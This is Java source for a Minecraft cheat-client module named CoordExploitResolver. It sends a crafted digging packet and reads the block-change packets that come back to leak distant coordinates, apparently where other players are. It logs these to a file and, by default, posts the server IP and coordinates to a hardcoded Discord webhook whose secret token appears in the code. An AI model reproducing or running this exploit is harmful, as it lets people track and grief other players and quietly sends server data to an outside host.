package io.ace.nordclient.hacks.exploit;

import club.minnced.discord.webhook.WebhookClient;
import io.ace.nordclient.CousinWare;
import io.ace.nordclient.command.Command;
import io.ace.nordclient.event.PacketEvent;
import io.ace.nordclient.hacks.Hack;
import io.ace.nordclient.utilz.Setting;
import net.minecraft.network.play.client.CPacketPlayer;
import net.minecraft.network.play.client.CPacketPlayerDigging;
import net.minecraft.network.play.server.SPacketBlockChange;
import net.minecraft.util.EnumFacing;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.ChunkPos;
import net.minecraft.util.text.TextFormatting;
import team.stiff.pomelo.impl.annotated.handler.annotation.Listener;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;

public class CoordExploit extends Hack {
    Setting loadChunks;
    Setting ignore;
    Setting latency;
    Setting antiPacket;
    Setting publicMessage;
    Setting dicord;

    public CoordExploit() {
        super("CoordExploitResolver", Category.EXPLOIT, -1);
        CousinWare.INSTANCE.settingsManager.rSetting(loadChunks = new Setting("LoadedChunks", this, false, "CoordExploitLoadedChunks", true));
        CousinWare.INSTANCE.settingsManager.rSetting(ignore = new Setting("Ignore", this, false, "CoordExploitIgnore", true));
        CousinWare.INSTANCE.settingsManager.rSetting(latency = new Setting("Latency", this, true, "CoordExploitLatency", true));
        CousinWare.INSTANCE.settingsManager.rSetting(antiPacket = new Setting("AntiPacket", this, true, "CoordExploitAntiPacket", true));
        CousinWare.INSTANCE.settingsManager.rSetting(publicMessage = new Setting("BroadCast", this, false, "", true));
        CousinWare.INSTANCE.settingsManager.rSetting(dicord = new Setting("Discord", this, true, "CoordExploitDiscord", true));
    }

    private long startTime = -1;
    private int messageTime = 0;
    WebhookClient webhookClient = WebhookClient.withUrl("https://discord.com/api/webhooks/863482717836804146/E0xaWAPrzf_hqaVBCA9BYBDN40z4XjrnrLTeB2NIj3nenKA5BWtJhB_YAo2rVYsP9N6z");
//
    public void onUpdate() {
        messageTime++;
    }

    @Listener
    public void onUpdate(PacketEvent.Send event) {
        if (event.getPacket() instanceof CPacketPlayer && antiPacket.getValBoolean()) {
            event.setCanceled(true);
        }
    }


    @Listener
    public void onUpdate(PacketEvent.Receive event) {
        if(event.getPacket() instanceof SPacketBlockChange){
            SPacketBlockChange packetIn = (SPacketBlockChange) event.getPacket();
            if(ignore.getValBoolean() && mc.world.isBlockLoaded(packetIn.getBlockPosition(),false))
                return;
            ChunkPos chunkPos = new ChunkPos(packetIn.getBlockPosition());
            if(mc.player.getDistanceSq(packetIn.getBlockPosition())>72) {
                if (loadChunks.getValBoolean()) {
                    mc.world.doPreChunk(chunkPos.x, chunkPos.z, true);
                    mc.world.markBlockRangeForRenderUpdate(chunkPos.x << 4, 0, chunkPos.z << 4, (chunkPos.x << 4) + 15, 256, (chunkPos.z << 4) + 15);
                }
            }
            if(!loadChunks.getValBoolean() && mc.player.getDistanceSq(packetIn.getBlockPosition())>500*500)
                event.setCanceled(true);
            if (dicord.getValBoolean()) webhookClient.send(mc.getCurrentServerData().serverIP + ": " + packetIn.getBlockPosition().toString());
            Command.sendClientSideMessage(TextFormatting.RED +"[DL]: "+TextFormatting.RESET +
                    packetIn.getBlockPosition().toString() + " -> " +packetIn.getBlockState().getBlock().getLocalizedName());
            writeToFile(packetIn.getBlockPosition().toString() + " -> " +packetIn.getBlockState().getBlock().getLocalizedName());

            //SendMessage(packetIn.getBlockPosition().toString() + " -> " +packetIn.getBlockState().getBlock().getLocalizedName());
            if(latency.getValBoolean() && startTime!=-1){
                Command.sendClientSideMessage("Latency = "+ (System.currentTimeMillis()-startTime) +" ms");
                startTime=-1;
            }
            if (publicMessage.getValBoolean() && messageTime > 20 * 20) {
               // mc.player.sendChatMessage("[CoordExploiter]: Found A Player Located In The " + getDimension(mc.player.dimension) + "  At:" + packetIn.getBlockPosition().toString());
                messageTime = 0;
            }
        }
    }

    public String getDimension(int id) {
        if (id == 1) return "End";
        else if (id == 0) return "Overworld";
        else if (id == -1) return "Nether";
        return "null";
    }


    @Override
    public void onEnable() {
        super.onEnable();
        if(mc.world == null)
            return;
        BlockPos pos = new BlockPos(-2518,68,-5341);
        startTime = System.currentTimeMillis();
        mc.player.connection.sendPacket(new CPacketPlayerDigging(CPacketPlayerDigging.Action.ABORT_DESTROY_BLOCK,pos, EnumFacing.UP));

    }



    @Override
    public void onDisable() {
        super.onDisable();
        startTime=-1;
    }

    protected static void writeToFile(final String coords) {
        try (final FileWriter fw = new FileWriter("CousinWareSpecialCoords", true);
             final BufferedWriter bw = new BufferedWriter(fw);
             final PrintWriter out = new PrintWriter(bw)) {
            out.println(coords);
        }
        catch (IOException ex) {}
    }
}
